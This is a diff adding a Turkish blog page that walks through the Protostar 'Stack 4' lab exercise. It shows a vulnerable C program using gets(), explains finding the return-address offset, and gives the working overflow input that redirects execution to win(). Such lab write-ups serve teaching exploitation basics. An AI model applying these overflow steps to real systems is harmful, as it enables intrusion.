@@ -1,0 +1,44 @@
+<!doctype html><html lang=tr-tr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=/style.css><link rel=icon type=image/png href=/favicon.png><meta http-equiv=cache-control content=public><meta name=description content="Burada bir şey yok"><title>Stack 4 | Emir (0xF61)</title><script async src="https://www.googletagmanager.com/gtag/js?id=UA-135684308-2"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','UA-135684308-2');</script></head><body><nav><ul class=menu>|<li><a href=/>Ana Sayfa</a></li>|<li><a href=/yaz%C4%B1lar/>Yazılar</a></li>|<li><a href=/etiketler/>Etiketler</a></li>|<li><a href=/linkler/>Linkler</a></li>|<li><a href=/ara/>Ara</a></li>|</ul><hr></nav><div class=article-meta></div><span class=rtime>📖 2 dakika</span>
+<a href=..>↪ Protostar</a><h1 class=baslik>Stack 4</h1><main><h1 id=stack4-c>Stack4.c</h1><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>win</span>()
+{
+  printf(<span style=color:#e6db74>&#34;code flow successfully changed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+}
+
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
+{
+  <span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>64</span>];
+
+  gets(buffer);
+}</code></pre></div><p><strong>Önceki seviyeden farkı burada fp yok!</strong></p><p><strong>Amaç:</strong> main fonksiyonu içerisinde ki stack taşırılarak <code>eip</code> değerini
+değiştirip programın akışına manipüle etmek.</p><h1 id=programın-çalıştırılması>Programın Çalıştırılması</h1><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>user@protostar:/opt/protostar/bin$ ./stack4
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+user@protostar:/opt/protostar/bin$ ./stack4
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD
+Segmentation fault</code></pre></div><p>Önceki seviyede fp değişkenini değiştirerek istediğimiz adresteki fonksiyonu
+çalıştırabiliyorduk fakat bu seviyede böyle bir imkanımız olmadığı için eip
+registerinin stackteki yerini istediğimiz şekilde doldurarak programın akışını
+değiştireceğiz.</p><p>Programlarda genellikle bir fonksiyon çağırıldığı zaman o fonksiyona girilmeden
+önce çalıştırılan fonksiyondan sonra, geri döneceği adresi stacke atar
+böylelikle hem fonksiyonların lokal değişkenleri birbirine karışmamış ve
+gereksiz yer kaplamamış olur.</p><h1 id=dönüş-adresini-tespit-etmek>Dönüş adresini tespit etmek</h1><p>Önceki seviyeden daha uzun bir karakter dizisi kullanıyorum çünkü önceki
+seviyedeki gibi lokal değişkeni değil lokal değişkenlerden önce stackte yer
+kaplayan dönüş adresini değiştireceğiz. Genellikle Segmentation Fault alana
+kadar A ekleyip sonrasına 4 bytelık farklı karakterler ekliyorum.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>user@protostar:/opt/protostar/bin$ ./stack4
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
+Segmentation fault
+user@protostar:/opt/protostar/bin$ dmesg | tail -1
+[16102.708303] stack4[1893]: segfault at 45454545 ip 45454545 sp bffffce0 error 4</code></pre></div><p>Programa yukarıdaki gibi uzun bir string verdikten sonra segmentation fault
+alıyoruz ve dmesg çıktısına baktığımızda <code>ip</code> registerinin <code>45454545</code> olduğunu
+görüyoruz.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#66d9ef>print</span>( chr(<span style=color:#ae81ff>0x45</span>) )
+E</code></pre></div><p><code>0x45</code>&lsquo;in E karakterine ait olduğunu tespit ettikten sonra atlamak istediğimiz
+fonksiyonun adresini bulmamız gerekiyor.</p><p>Hızlıca önceki seviyede yaptığım gibi win fonksiyonunun adresini tespit
+ediyorum.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>user@protostar:/opt/protostar/bin$ objdump -S stack4 | grep win
+080483f4 &lt;win&gt;:</code></pre></div><p>win fonksiyonunun yerini <code>080483f4</code> olarak not ediyoruz.</p><h1 id=programın-akışının-değiştirilmesi>Programın Akışının Değiştirilmesi</h1><p>Programa verdiğim 76 adet &ldquo;A&rdquo; karakteirnin sonuna bu adresi ekliyorum.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>user@protostar:/opt/protostar/bin$ echo -e &#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf4\x83\x04\x08&#34; | ./stack4
+code flow successfully changed
+Segmentation fault</pre></div><p>Böylelikle fonksiyondan çıkarkan eip&rsquo;ye atanan değişkeni <code>080483f4</code> değerine
+döndürüp bu adresteki fonksiyonu çalıştırabiliyoruz.</p></main><footer><hr><a href=/index.xml>Feed</a></footer></body></html>
